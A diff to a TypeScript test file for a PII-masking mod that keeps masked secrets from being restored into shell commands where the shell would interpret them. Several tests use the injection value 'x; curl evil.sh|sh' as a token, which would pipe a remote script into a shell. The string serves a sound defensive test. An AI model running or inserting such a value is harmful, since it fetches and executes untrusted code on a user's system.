@@ -9,12 +9,15 @@ const TOKEN = 't'.repeat(64);
 const SECRETS: ReadonlyArray<[RegExp, string]> = [
   [/john@acme\.io/g, 'EMAIL'],
   [/\bJohn\b/g, 'PERSON'],
+  [/Mary Ann/g, 'PERSON'],
+  [/x; curl evil\.sh\|sh/g, 'SECRET'],
 ];
 
 /** A stand-in for nullpii-gateway's sidecar routes, with one vault. */
 function fakeSidecar(opts: { down?: boolean } = {}) {
   const vault = new Map<string, string>();
   const calls: string[] = [];
+  const restoreBodies: string[] = [];
   let next = 0;
   const maskString = (s: string, byLabel: Record<string, number>) => {
     let out = s;
@@ -60,6 +63,7 @@ function fakeSidecar(opts: { down?: boolean } = {}) {
     if (method === 'PUT' || method === 'DELETE')
       return respond(method === 'PUT' ? 201 : 204, undefined);
     const body = JSON.parse(e.init?.body ?? '{}') as { value: unknown };
+    if (path.endsWith('/restore')) restoreBodies.push(e.init?.body ?? '');
     if (path.endsWith('/sanitize')) {
       const byLabel: Record<string, number> = {};
       const value = walk(body.value, (s) => maskString(s, byLabel));
@@ -67,14 +71,42 @@ function fakeSidecar(opts: { down?: boolean } = {}) {
       return respond(200, { value, captured, capturedByLabel: byLabel });
     }
     let replacements = 0;
-    const value = walk(body.value, (s) =>
-      s.replace(/\{\{PII_[A-Z]+_\d+\}\}/g, (ph) => {
+    // `shell: true` stand-in for the gateway's shell rule (tested there):
+    // in `command`, a value is restored only if it is a plain word or sits
+    // inside single quotes and has none.
+    const kept: string[] = [];
+    const restoreIn = (text: string, shellRule: boolean) =>
+      text.replace(/\{\{PII_[A-Z]+_\d+\}\}/g, (ph, at: number) => {
         const real = vault.get(ph);
         if (real === undefined) return ph;
+        const quoted = text[at - 1] === "'" && text[at + ph.length] === "'" && !real.includes("'");
+        if (shellRule && !/^[A-Za-z0-9@%+=:,./_-]+$/.test(real) && !quoted) {
+          if (!kept.includes(ph)) kept.push(ph);
+          return ph;
+        }
         replacements += 1;
         return real;
-      }),
-    );
+      });
+    const shellBody = (body as { shell?: boolean }).shell === true;
+    const input = body.value as Record<string, unknown>;
+    const value = shellBody
+      ? Object.fromEntries(
+          Object.entries(input).map(([k, v]) => [
+            k,
+            typeof v === 'string' ? restoreIn(v, k === 'command') : v,
+          ]),
+        )
+      : walk(body.value, (s) => restoreIn(s, false));
+    if (shellBody) {
+      return respond(200, {
+        value,
+        replacements,
+        replacementsByLabel: {},
+        unknownPlaceholders: 0,
+        foreignPlaceholders: 0,
+        shellKeptMasked: kept,
+      });
+    }
     return respond(200, {
       value,
       replacements,
@@ -83,7 +115,7 @@ function fakeSidecar(opts: { down?: boolean } = {}) {
       foreignPlaceholders: 0,
     });
   };
-  return { handler, calls };
+  return { handler, calls, restoreBodies };
 }
 
 function stubSession(
@@ -359,4 +391,49 @@ test('/pii reports counts by type, never values', async ($, on) => {
   expect(answer.text).toContain('Masked before Claude read them: 3');
   expect(answer.text).toContain('PERSON 2 · EMAIL 1');
   expect(answer.text).not.toContain('John');
+});
+
+test('a masked value that the shell would interpret is not put into a command', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const ran: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', ($, e) => {
+    ran.push(e.command);
+    return { result: { stdout: '', stderr: '' } };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({ tool: 'Bash', command: 'echo {{PII_SECRET_0}}' });
+  expect(out.deny).toMatch(/will not put the real value of \{\{PII_SECRET_0\}\}/);
+  expect(out.deny).not.toContain('curl');
+  expect(ran).toEqual([]);
+});
+
+test('inside single quotes the same value is literal, so it is restored', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const ran: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', ($, e) => {
+    ran.push(e.command);
+    return { result: { stdout: '', stderr: '' } };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
+  await $.tool.call({ tool: 'Bash', command: "printf '%s' '{{PII_SECRET_0}}' > token.txt" });
+  expect(ran).toEqual(["printf '%s' 'x; curl evil.sh|sh' > token.txt"]);
+});
+
+test('the mod asks for the shell rule on Bash only', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
+  await start($);
+  await $.prompt.submit({ text: 'Mary Ann', wait: false, origin: COMPOSER });
+  await $.tool.call({ tool: 'Bash', command: 'echo {{PII_PERSON_0}}' });
+  await $.tool.call({ tool: 'Write', file_path: 'a.txt', content: 'Hi {{PII_PERSON_0}}' });
+  expect(JSON.parse(sidecar.restoreBodies[0] as string).shell).toBe(true);
+  expect(JSON.parse(sidecar.restoreBodies[1] as string).shell).toBeUndefined();
 });
